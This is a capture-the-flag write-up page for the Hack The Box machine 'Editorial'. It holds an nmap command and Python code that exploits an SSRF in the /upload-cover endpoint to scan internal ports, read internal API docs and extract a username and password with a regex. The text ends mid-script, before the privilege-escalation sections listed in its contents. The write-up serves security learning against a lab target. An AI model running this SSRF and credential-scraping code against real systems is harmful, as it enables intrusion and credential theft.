@@ -1,0 +1,434 @@
+<!doctype html>
+<html lang="en" data-accent="moss" data-f-ga4="G-ZMH6NLL7C7">
+<head>
+<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" /><script>try{var t=localStorage.getItem("facet-theme");if(/^(dark|light|auto)$/.test(t))document.documentElement.dataset.theme=t}catch(e){}</script>
+	<meta name="description" content="Hack The Box - Editorial" />
+	<meta name="author" content="Shengtuo Hu" />
+	<meta name="theme-color" content="#13161c" media="(prefers-color-scheme: dark)" />
+	<meta name="theme-color" content="#f5f7f9" media="(prefers-color-scheme: light)" />
+	<title>Editorial - nu1lptr</title>
+	<link rel="canonical" href="https://shengtuo.me/blog/htb/editorial/" /><link rel="icon" href="https://shengtuo.me/favicon.ico" sizes="32x32" />
+	<link rel="icon" href="https://shengtuo.me/favicon.svg" type="image/svg+xml" />
+	<link rel="apple-touch-icon" href="https://shengtuo.me/apple-touch-icon.png" />
+	<link rel="alternate" type="application/rss+xml" title="nu1lptr - RSS Feed" href="https://shengtuo.me/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="nu1lptr - Atom Feed" href="https://shengtuo.me/atom.xml" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/facet.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/cast/cast-layered.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/icons.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/giallo.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/css/site.css" />
+
+	<meta property="og:site_name" content="nu1lptr" /><meta property="og:title" content="Editorial" />
+	<meta property="og:url" content="https://shengtuo.me/blog/htb/editorial/" />
+	<meta property="og:description" content="Hack The Box - Editorial" />
+	<meta property="og:image" content="https://shengtuo.me/cards/blog/htb/editorial.png" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="article:published_time" content="2025-08-19T22:41:36-07:00" />
+	<meta property="article:author" content="Shengtuo Hu" />
+	<meta property="article:tag" content="HackTheBox" /><meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="Editorial" />
+	<meta name="twitter:description" content="Hack The Box - Editorial" />
+	<meta name="twitter:image" content="https://shengtuo.me/cards/blog/htb/editorial.png" />
+	<meta name="twitter:site" content="@ShengtuoHu" />
+	<meta name="twitter:creator" content="@ShengtuoHu" /><script type="application/ld+json">
+{
+	"@context": "https://schema.org",
+	"@type": "BlogPosting",
+	"@id": "https://shengtuo.me/blog/htb/editorial/#article",
+	"mainEntityOfPage": "https://shengtuo.me/blog/htb/editorial/",
+	"url": "https://shengtuo.me/blog/htb/editorial/",
+	"headline": "Editorial",
+	"description": "Hack The Box - Editorial",
+	"datePublished": "2025-08-19T22:41:36-07:00",
+	"dateModified": "2025-08-19T22:41:36-07:00",
+	"image": "https://shengtuo.me/cards/blog/htb/editorial.png",
+	"keywords": ["HackTheBox"],
+	"inLanguage": "en",
+	"author": {
+		"@type": "Person",
+		"@id": "https://shengtuo.me/#person",
+		"name": "Shengtuo Hu",
+		"url": "https://shengtuo.me/"
+	},
+	"publisher": { "@id": "https://shengtuo.me/#person" }
+}
+</script>
+
+
+
+</head>
+<body>
+  <a class="f-visually-hidden" href="#main">Skip to content</a>
+  <nav class="f-nav f-nav--fixed" aria-label="Site">
+  <a class="f-nav__brand" href="https://shengtuo.me">nu1lptr</a>
+  <a href="https://shengtuo.me/blog/" aria-current="page">Blog</a>
+  <a href="https://shengtuo.me/projects/">Projects</a>
+  <a href="https://shengtuo.me/resume/">Resume</a>
+  <button class="f-btn f-btn--quiet site-search-open" type="button" aria-label="Search" title="Search (/)" hidden>
+    <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg>
+  </button>
+  <button class="f-theme-toggle" type="button" data-f-theme-toggle>Auto</button>
+</nav>
+
+  
+<main id="main" class="f-docs f-prose" data-f-code-ln="true" data-f-code-wrap="true" data-f-code-frame="false">
+  <nav class="f-toc" aria-label="On this page" data-f-scrollspy>
+  <p class="f-docs__label">On this page</p>
+  <a href="#port-scanning">Port Scanning</a>
+  <a href="#exploit-upload-cover-api">Exploit /upload-cover API</a>
+  <a href="#explore-locally-exposed-ports">Explore Locally Exposed Ports</a>
+  <a href="#shell-as-dev">Shell as dev</a>
+  <a href="#shell-as-prod">Shell as prod</a>
+  <a href="#shell-as-root">Shell as root</a>
+  <a href="#references">References</a>
+</nav>
+
+  <article class="site-post">
+<header class="f-reading__title">
+  <p class="f-kicker"><a href="https://shengtuo.me/blog/">nu1lptr&#39;s Blog</a></p>
+  <h1>Editorial</h1>
+  <p class="f-meta site-post-meta">
+    <time datetime="2025-08-19">Aug 19, 2025</time> · 1 min read · <a href="https://shengtuo.me/tags/hackthebox/">HackTheBox</a> · <button class="f-btn f-btn--quiet site-share" type="button">Share</button><span class="site-share-status" role="status"></span>
+  </p>
+</header>
+
+    <ul>
+<li>Editorial (Easy): <a rel="noopener external" target="_blank" href="https://www.hackthebox.com/machines/editorial">https://www.hackthebox.com/machines/editorial</a></li>
+<li>My notes: <a rel="noopener external" target="_blank" href="https://github.com/h1994st/HTB/blob/main/Editorial/exploit.ipynb">https://github.com/h1994st/HTB/blob/main/Editorial/exploit.ipynb</a></li>
+</ul>
+<h2 id="port-scanning"><a class="zola-anchor" href="#port-scanning" aria-label="Link to this section">#</a>
+Port Scanning</h2>
+<blockquote>
+<p>Remember to add a reference in <code>/etc/hosts</code> for <code>editorial.htb</code></p>
+</blockquote>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A editorial.htb</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">from</span><span> common</span><span class="z-3 z-i"> import</span><span> scan_ports</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-2">scan_ports</span><span class="z-3">(&quot;</span><span class="z-6">editorial.htb</span><span class="z-3">&quot;)</span></span></code></pre><h2 id="exploit-upload-cover-api"><a class="zola-anchor" href="#exploit-upload-cover-api" aria-label="Link to this section">#</a>
+Exploit <code>/upload-cover</code> API</h2>
+<ul>
+<li>Endpoint: <code>http://editorial.htb/upload-cover</code></li>
+</ul>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> asyncio</span></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> typing</span><span class="z-3 z-i"> import</span><span> Optional</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">import</span><span> aiohttp</span></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> tqdm</span><span class="z-3">.</span><span>notebook</span><span class="z-3 z-i"> import</span><span> tqdm</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>BASE_URL</span><span class="z-3"> = &quot;</span><span class="z-6">http://editorial.htb</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>API_URL</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;</span><span class="z-10">{</span><span>BASE_URL</span><span class="z-10">}</span><span class="z-6">/upload-cover&quot;</span></span>
+<span class="giallo-l"><span>FAILURE_IMAGE_PATH</span><span class="z-3"> = (</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-6">/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">)</span></span>
+<span class="giallo-l"><span>MAX_CONCURRENT_REQUESTS</span><span class="z-3"> =</span><span class="z-10"> 40</span></span>
+<span class="giallo-l"><span>LOCALHOST_URL_FMT</span><span class="z-3"> = &quot;</span><span class="z-6">http://127.0.0.1:</span><span class="z-10">{</span><span class="z-7">:d</span><span class="z-10">}</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> ssrf_request</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span><span class=" z-i"> url</span><span class="z-3">:</span><span class="z-12"> str</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span> Optional</span><span class="z-3">[</span><span class="z-12">str</span><span class="z-3">]:</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3"> =</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">FormData</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">bookurl</span><span class="z-3">&quot;,</span><span class="z-2"> url</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">bookfile</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class=" z-i">        value</span><span class="z-3">=&quot;&quot;,</span></span>
+<span class="giallo-l"><span class=" z-i">        content_type</span><span class="z-3">=&quot;</span><span class="z-6">application/octet-stream</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class=" z-i">        filename</span><span class="z-3">=&quot;&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    try</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>        response</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> session</span><span class="z-3">.</span><span class="z-2">post</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">            API_URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">            data</span><span class="z-3">=</span><span class="z-2">data</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">            raise_for_status</span><span class="z-3">=True,</span></span>
+<span class="giallo-l"><span class=" z-i">            timeout</span><span class="z-3">=</span><span class="z-2">aiohttp</span><span class="z-3">.</span><span class="z-2">ClientTimeout</span><span class="z-3">(</span><span class=" z-i">total</span><span class="z-3">=</span><span class="z-10">10</span><span class="z-3">),</span></span>
+<span class="giallo-l"><span class="z-3">        )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    except</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ServerConnectionError</span><span class="z-3 z-i"> as</span><span> err</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    except</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientError</span><span class="z-3 z-i"> as</span><span> err</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Error: </span><span class="z-10">{</span><span class="z-2">err</span><span class="z-7">=</span><span class="z-10">}</span><span class="z-6">, </span><span class="z-10">{</span><span class="z-2">url</span><span class="z-7">=</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    except</span><span> asyncio</span><span class="z-3">.</span><span class="z-9">TimeoutError</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Request timed out: </span><span class="z-10">{</span><span class="z-2">url</span><span class="z-7">=</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    return await</span><span> response</span><span class="z-3">.</span><span class="z-2">text</span><span class="z-3">()</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> check_port</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    port</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    sem</span><span class="z-3">:</span><span> asyncio</span><span class="z-3">.</span><span class="z-9">Semaphore</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span> Optional</span><span class="z-3">[</span><span>tuple</span><span class="z-3">[</span><span class="z-12">int</span><span class="z-3">,</span><span class="z-12"> str</span><span class="z-3">]]:</span></span>
+<span class="giallo-l"><span>    bookurl</span><span class="z-3"> =</span><span> LOCALHOST_URL_FMT</span><span class="z-3">.</span><span class="z-2">format</span><span class="z-3">(</span><span class="z-2">port</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    async with</span><span> sem</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>        image_path</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> ssrf_request</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> bookurl</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> image_path</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"><span>        image_path</span><span class="z-3"> =</span><span> image_path</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-3"> (</span><span>port</span><span class="z-3">,</span><span> image_path</span><span class="z-3">)</span><span class="z-3 z-i"> if</span><span> image_path</span><span class="z-3"> !=</span><span> FAILURE_IMAGE_PATH</span><span class="z-3 z-i"> else</span><span class="z-3"> None</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> fuzz_ports</span><span class="z-3">() -&gt;</span><span> list</span><span class="z-3">[</span><span class="z-12">int</span><span class="z-3">]:</span></span>
+<span class="giallo-l"><span>    ports</span><span class="z-3"> = []</span></span>
+<span class="giallo-l"><span>    sem</span><span class="z-3"> =</span><span> asyncio</span><span class="z-3">.</span><span class="z-2">Semaphore</span><span class="z-3">(</span><span class="z-2">MAX_CONCURRENT_REQUESTS</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    async with</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">ClientSession</span><span class="z-3">()</span><span class="z-3 z-i"> as</span><span> session</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">        #</span><span class="z-3 z-i"> NOTE</span><span class="z-1 z-i">: should iterate over all ports. Since we know `5000` is the answer,</span></span>
+<span class="giallo-l"><span class="z-1 z-i">        # we can reduce the range</span></span>
+<span class="giallo-l"><span>        tasks</span><span class="z-3"> = [</span><span class="z-2">check_port</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> port</span><span class="z-3">,</span><span class="z-2"> sem</span><span class="z-3">)</span><span class="z-3 z-i"> for</span><span> port</span><span class="z-3 z-i"> in</span><span class="z-2"> range</span><span class="z-3">(</span><span class="z-10">4500</span><span class="z-3">,</span><span class="z-10"> 5001</span><span class="z-3">)]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">        try</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            for</span><span> coro</span><span class="z-3 z-i"> in</span><span class="z-2"> tqdm</span><span class="z-3">(</span><span class="z-2">asyncio</span><span class="z-3">.</span><span class="z-2">as_completed</span><span class="z-3">(</span><span class="z-2">tasks</span><span class="z-3">),</span><span class=" z-i"> total</span><span class="z-3">=</span><span class="z-2">len</span><span class="z-3">(</span><span class="z-2">tasks</span><span class="z-3">)):</span></span>
+<span class="giallo-l"><span>                result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> coro</span></span>
+<span class="giallo-l"><span class="z-3 z-i">                if</span><span> result</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">                    continue</span></span>
+<span class="giallo-l"><span>                port</span><span class="z-3">,</span><span> _</span><span class="z-3"> =</span><span> result</span></span>
+<span class="giallo-l"><span class="z-2">                print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Found open port: </span><span class="z-10">{</span><span class="z-2">port</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>                ports</span><span class="z-3">.</span><span class="z-2">append</span><span class="z-3">(</span><span class="z-2">port</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        except</span><span> asyncio</span><span class="z-3">.</span><span class="z-9">CancelledError</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(&quot;</span><span class="z-6">Cancelled</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        except</span><span class="z-12"> KeyboardInterrupt</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(&quot;</span><span class="z-6">Interrupted by user</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Open ports: </span><span class="z-10">{</span><span class="z-2">ports</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    return</span><span> ports</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>ports</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> fuzz_ports</span><span class="z-3">()</span></span></code></pre><h2 id="explore-locally-exposed-ports"><a class="zola-anchor" href="#explore-locally-exposed-ports" aria-label="Link to this section">#</a>
+Explore Locally Exposed Ports</h2>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> json</span></span>
+<span class="giallo-l"><span class="z-3 z-i">import</span><span> pprint</span></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> typing</span><span class="z-3 z-i"> import</span><span> Optional</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">import</span><span> aiohttp</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> fetch_image</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span><span class=" z-i"> image_path</span><span class="z-3">:</span><span class="z-12"> str</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span> Optional</span><span class="z-3">[</span><span class="z-12">str</span><span class="z-3">]:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span class="z-3"> not</span><span> image_path</span><span class="z-3">.</span><span class="z-2">startswith</span><span class="z-3">(&quot;</span><span class="z-6">/</span><span class="z-3">&quot;):</span></span>
+<span class="giallo-l"><span>        image_path</span><span class="z-3"> = &quot;</span><span class="z-6">/</span><span class="z-3">&quot; +</span><span> image_path</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    try</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>        image_url</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;</span><span class="z-10">{</span><span>BASE_URL</span><span class="z-10">}{</span><span>image_path</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        async with</span><span> session</span><span class="z-3">.</span><span class="z-2">get</span><span class="z-3">(</span><span class="z-2">image_url</span><span class="z-3">,</span><span class=" z-i"> raise_for_status</span><span class="z-3">=True)</span><span class="z-3 z-i"> as</span><span> response</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            return await</span><span> response</span><span class="z-3">.</span><span class="z-2">text</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    except</span><span class="z-12"> Exception</span><span class="z-3 z-i"> as</span><span> e</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Error fetching image: </span><span class="z-10">{</span><span class="z-2">e</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> fetch_content</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span><span class=" z-i"> port</span><span class="z-3">:</span><span class="z-12"> int</span><span class="z-3">,</span><span class=" z-i"> endpoint</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3"> = &quot;&quot;</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span> Optional</span><span class="z-3">[</span><span class="z-12">str</span><span class="z-3">]:</span></span>
+<span class="giallo-l"><span>    bookurl</span><span class="z-3"> =</span><span> LOCALHOST_URL_FMT</span><span class="z-3">.</span><span class="z-2">format</span><span class="z-3">(</span><span class="z-2">port</span><span class="z-3">) +</span><span> endpoint</span></span>
+<span class="giallo-l"><span>    image_path</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> ssrf_request</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> bookurl</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> image_path</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span class="z-3"> not</span><span> image_path</span><span class="z-3">.</span><span class="z-2">startswith</span><span class="z-3">(&quot;</span><span class="z-6">/</span><span class="z-3">&quot;):</span></span>
+<span class="giallo-l"><span>        image_path</span><span class="z-3"> = &quot;</span><span class="z-6">/</span><span class="z-3">&quot; +</span><span> image_path</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;GET </span><span class="z-10">{</span><span class="z-2">bookurl</span><span class="z-10">}</span><span class="z-6">: </span><span class="z-10">{</span><span class="z-2">image_path</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    return await</span><span class="z-2"> fetch_image</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> image_path</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">assert</span><span class="z-2"> len</span><span class="z-3">(</span><span class="z-2">ports</span><span class="z-3">) ==</span><span class="z-10"> 1</span></span>
+<span class="giallo-l"><span>port</span><span class="z-3"> =</span><span> ports</span><span class="z-3">[</span><span class="z-10">0</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">ClientSession</span><span class="z-3">()</span><span class="z-3 z-i"> as</span><span> session</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    content</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> fetch_content</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> port</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    api_docs</span><span class="z-3">:</span><span class="z-12"> dict</span><span class="z-3"> =</span><span> json</span><span class="z-3">.</span><span class="z-2">loads</span><span class="z-3">(</span><span class="z-2">content</span><span class="z-3">)</span><span class="z-3 z-i"> if</span><span> content</span><span class="z-3 z-i"> else</span><span class="z-3"> {}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>pprint</span><span class="z-3">.</span><span class="z-2">pprint</span><span class="z-3">(</span><span class="z-2">api_docs</span><span class="z-3">)</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> pprint</span></span>
+<span class="giallo-l"><span class="z-3 z-i">import</span><span> re</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>CONTENT_NOT_FOUND</span><span class="z-3"> = &quot;</span><span class="z-6">404 Not Found</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>USERNAME_PASSWORD_PATTERN</span><span class="z-3"> =</span><span> re</span><span class="z-3">.</span><span class="z-2">compile</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-7">    r</span><span class="z-3">&quot;</span><span class="z-6">Username: </span><span class="z-3">(</span><span class="z-9">?P&lt;username&gt;</span><span class="z-6">\w</span><span class="z-3">+)</span><span>\\</span><span class="z-6">nPassword: </span><span class="z-3">(</span><span class="z-9">?P&lt;password&gt;</span><span class="z-3">[</span><span class="z-6">\w!@</span><span class="z-3">]+)</span><span>\\</span><span class="z-6">n</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>endpoints</span><span class="z-3"> = []</span></span>
+<span class="giallo-l"><span class="z-3 z-i">for</span><span> category</span><span class="z-3">,</span><span> entries</span><span class="z-3 z-i"> in</span><span> api_docs</span><span class="z-3">.</span><span class="z-2">items</span><span class="z-3">():</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    for</span><span> entry</span><span class="z-3 z-i"> in</span><span> entries</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        for</span><span> api_name</span><span class="z-3">,</span><span> api_doc</span><span class="z-3 z-i"> in</span><span> entry</span><span class="z-3">.</span><span class="z-2">items</span><span class="z-3">():</span></span>
+<span class="giallo-l"><span>            endpoints</span><span class="z-3">.</span><span class="z-2">append</span><span class="z-3">(</span><span class="z-2">api_doc</span><span class="z-3">[&quot;</span><span class="z-6">endpoint</span><span class="z-3">&quot;])</span></span>
+<span class="giallo-l"><span>pprint</span><span class="z-3">.</span><span class="z-2">pprint</span><span class="z-3">(</span><span class="z-2">endpoints</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i"># Extract username and password</span></span>
+<span class="giallo-l"><span>username</span><span class="z-3"> = None</span></span>
+<span class="giallo-l"><span>password</span><span class="z-3"> = None</span></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">ClientSession</span><span class="z-3">()</span><span class="z-3 z-i"> as</span><span> session</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    for</span><span> endpoint</span><span class="z-3 z-i"> in</span><span> endpoints</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>        content</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> fetch_content</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> port</span><span class="z-3">,</span><span class=" z-i"> endpoint</span><span class="z-3">=</span><span class="z-2">endpoint</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> content</span><span class="z-3"> is not None and</span><span> CONTENT_NOT_FOUND</span><span class="z-3"> not in</span><span> content</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            if</span><span> match</span><span class="z-3"> :=</span><span> USERNAME_PASSWORD_PATTERN</span><span class="z-3">.</span><span class="z-2">search</span><span class="z-3">(</span><span class="z-2">content</span><span class="z-3">):</span></span>
+<span class="giallo-l"><span>                payload</span><span class="z-3"> =</span><span> json</span><span class="z-3">.</span><span class="z-2">loads</span><span class="z-3">(</span><span class="z-2">content</span><span class="z-3">)</span><span class="z-3 z-i"> if</span><span> content</span><span class="z-3 z-i"> else</span><span class="z-3"> {}</span></span>
+<span class="giallo-l"><span class="z-2">                print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Content from </span><span class="z-10">{</span><span class="z-2">endpoint</span><span class="z-10">}</span><span class="z-6">:&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-1 z-i">                # pprint.pprint(payload)</span></span>
+<span class="giallo-l"><span class="z-2">                print</span><span class="z-3">(</span><span class="z-2">payload</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>                username</span><span class="z-3"> =</span><span> match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&quot;</span><span class="z-6">username</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>                password</span><span class="z-3"> =</span><span> match</span><span class="z-3">.</span><span class="z-2">group</span><span class="z-3">(&quot;</span><span class="z-6">password</span><span class="z-3">&quot;)</span></span>
